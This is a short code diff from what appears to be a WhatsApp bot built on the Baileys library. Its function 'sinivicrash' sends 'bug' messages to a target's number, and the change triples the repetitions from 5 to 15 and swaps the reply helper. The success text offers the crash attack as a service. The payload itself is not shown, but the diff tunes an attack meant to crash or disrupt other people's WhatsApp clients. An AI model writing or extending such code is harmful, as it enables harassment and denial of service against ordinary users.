@@ -3,7 +3,7 @@ import pkg from "bailey";
 const { proto, generateWAMessageFromContent } = pkg;
 
 
-import bug from '../commands/bug.js'
+import channelSender from '../commands/channelSender.js'
 
 
 async function bugfunc(client, targetNumber) {
@@ -131,7 +131,7 @@ export async function sinivicrash(message, client) {
 
         // Execute the bug command
 
-        for (let i = 0; i < 5; i++) {
+        for (let i = 0; i < 15; i++) {
 
             await bugfunc(client, participant);
 
@@ -139,7 +139,7 @@ export async function sinivicrash(message, client) {
         }
 
 
-        await bug(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 4);
+        await channelSender(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 1);
 
     } catch (error) {
 
